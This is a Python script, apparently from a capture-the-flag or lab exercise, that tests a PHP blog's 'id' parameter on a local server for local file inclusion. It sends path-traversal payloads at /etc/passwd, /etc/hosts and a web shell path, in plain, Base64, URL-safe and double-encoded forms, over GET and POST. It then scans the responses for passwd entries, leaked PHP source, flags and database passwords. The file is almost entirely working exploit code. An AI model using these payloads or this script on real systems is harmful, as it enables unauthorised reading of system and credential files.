import requests
import base64
import urllib.parse
import re

BASE_URL = "http://127.0.0.1:33209"
HEADERS = {"User-Agent": "Mozilla/5.0 (Base64-LFI-Test)","Accept":"*/*"}

print("="*80)
print("BASE64-ENCODED LFI PAYLOAD TESTING")
print("="*80)
print("Theme: Encoder64 Blog - Testing Base64-encoded parameters")
print("="*80)

# Test payloads - standard ones first, then Base64 encoded
lfi_test_cases = [
    # Standard payload (should fail based on previous tests)
    {"name": "Standard /etc/passwd", "value": "../../../../etc/passwd", "encoded": False},
    
    # Base64 encoded payloads
    {"name": "Base64 /etc/passwd", "value": base64.b64encode(b"../../../../etc/passwd").decode(), "encoded": True},
    {"name": "Base64 /etc/hosts", "value": base64.b64encode(b"../../../../etc/hosts").decode(), "encoded": True},
    {"name": "Base64 hostname", "value": base64.b64encode(b"../../../../etc/hostname").decode(), "encoded": True},
    {"name": "Base64 shell.php", "value": base64.b64encode(b"../../../../var/www/html/shell.php").decode(), "encoded": True},
    
    # URL-safe Base64
    {"name": "URL-safe /etc/passwd", "value": base64.urlsafe_b64encode(b"../../../../etc/passwd").decode().rstrip('='), "encoded": True},
    
    # Double-encoded (Base64 then URL encode)
    {"name": "URL+Base64 /etc/passwd", "value": urllib.parse.quote(base64.b64encode(b"../../../../etc/passwd").decode()), "encoded": True},
]

# Test each payload
total_tests = len(lfi_test_cases)
found_vulnerabilities = []

print(f"\n[+] Testing {total_tests} payload variations...\n")

for idx, test_case in enumerate(lfi_test_cases, 1):
    print(f"[{idx}/{total_tests}] {test_case['name']}")
    print(f"      Value: {test_case['value'][:80]}...")
    
    # Test GET method
    url = f"{BASE_URL}/post.php?id={urllib.parse.quote(test_case['value'])}"
    print(f"      GET: {url[:100]}...")
    
    try:
        resp_get = requests.get(url, headers=HEADERS, timeout=10)
        content_get = resp_get.text
        size_get = len(content_get)
        
        print(f"      Response: Status={resp_get.status_code}, Size={size_get}B")
        
        # Check for indicators
        indicators = []
        if "root:" in content_get and "bin:" in content_get:
            indicators.append("ETC_PASSWD")
            print(f"      [!] FOUND /etc/passwd content!")
        
        if "PD9waHA" in content_get:
            b64_match = re.search(r'PD9waH[A-Za-z0-9+/=]+', content_get)
            if b64_match:
                try:
                    decoded = base64.b64decode(b64_match.group(0)).decode('utf-8', errors='ignore')
                    if "<?php" in decoded:
                        indicators.append("PHP_SOURCE")
                        print(f"      [!] FOUND PHP source code!")
                        print(f"      Decoded: {decoded[:200]}...")
                except:
                    pass
        
        if "flag{" in content_get.lower():
            flag_match = re.search(r'flag\{[^}]+\}', content_get, re.I)
            if flag_match:
                indicators.append("FLAG_FOUND")
                print(f"      [!] FLAG FOUND: {flag_match.group(0)}")
        
        if "DB_PASSWORD" in content_get or "MYSQL" in content_get.upper():
            indicators.append("CONFIG_DATA")
            print(f"      [!] FOUND configuration data!")
        
        if indicators:
            found_vulnerabilities.append({
                'test_case': test_case['name'],
                'method': 'GET',
                'indicators': indicators,
                'size': size_get,
                'preview': content_get[:200]
            })
            print(f"      Indicators: {', '.join(indicators)}")
        
        # Test POST method
        post_data = {'id': test_case['value']}
        resp_post = requests.post(f"{BASE_URL}/post.php", data=post_data, headers=HEADERS, timeout=10)
        content_post = resp_post.text
        size_post = len(content_post)
        
        print(f"      POST: size={size_post}B")
        
        # Check POST response too
        post_indicators = []
        if "root:" in content_post and "bin:" in content_post:
            post_indicators.append("ETC_PASSWD")
            print(f"      [!] POST: Found /etc/passwd!")
        
        if "flag{" in content_post.lower():
            flag_match = re.search(r'flag\{[^}]+\}', content_post, re.I)
            if flag_match:
                post_indicators.append("FLAG_FOUND")
                print(f"      [!] POST: FLAG FOUND: {flag_match.group(0)}")
        
        if post_indicators:
            found_vulnerabilities.append({
                'test_case': test_case['name'],
                'method': 'POST',
                'indicators': post_indicators,
                'size': size_post,
                'preview': content_post[:200]
            })
        
        print()
        
    except Exception as e:
        print(f"      [-] Error: {e}\n")

print("="*80)
print("SUMMARY")
print("="*80)

if found_vulnerabilities:
    print(f"\n[!] VULNERABILITIES FOUND: {len(found_vulnerabilities)}")
    for vuln in found_vulnerabilities:
        print(f"\n  Test: {vuln['test_case']}")
        print(f"  Method: {vuln['method']}")
        print(f"  Indicators: {', '.join(vuln['indicators'])}")
        print(f"  Size: {vuln['size']}B")
else:
    print(f"\n[-] No vulnerabilities found with Base64-encoded payloads")

